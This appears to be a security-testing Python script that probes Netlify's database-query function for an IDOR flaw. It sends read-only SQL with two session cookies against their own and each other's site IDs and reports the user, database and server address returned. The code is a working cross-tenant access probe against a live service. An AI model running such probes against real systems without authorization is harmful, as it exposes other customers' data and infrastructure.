# -*- coding: utf-8 -*-
"""越权矩阵:database-query 接口 siteId 归属校验测试(全部只读)
组合1 A_cookie + SITE_A  (基线:应通)
组合2 A_cookie + SITE_B  (IDOR 核心:不应通)
组合3 B_cookie + SITE_B  (基线:应通)
组合4 B_cookie + SITE_A  (反向 IDOR:不应通)
SQL: select current_user, current_database() (零副作用)
"""
import http.client, ssl, gzip, brotli, json, sys, time
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, COOKIE_B, SITE_A

SITE_B = 'd2977de0-d24d-4544-81cb-933e610cad7d'
ctx = ssl.create_default_context()
P = '/.netlify/functions/database-query'


def q(cookie, site_id, sql, timeout=60):
    t0 = time.time()
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': cookie,
         'Content-Type': 'application/json'}
    body = {'siteId': site_id, 'action': 'query', 'sql': sql}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw[:2000].decode('utf-8', 'ignore'), round(time.time() - t0, 1)


SQL = 'select current_user::text as u, current_database()::text as db, inet_server_addr()::text as srv'

combo = [
    ('A->A baseline', COOKIE_A, SITE_A),
    ('A->B IDOR    ', COOKIE_A, SITE_B),
    ('B->B baseline', COOKIE_B, SITE_B),
    ('B->A IDOR    ', COOKIE_B, SITE_A),
]
for name, ck, sid in combo:
    s, b, dt = q(ck, sid, SQL)
    print('%s [%d] %.1fs' % (name, s, dt))
    print('   ' + b[:600])
    print()
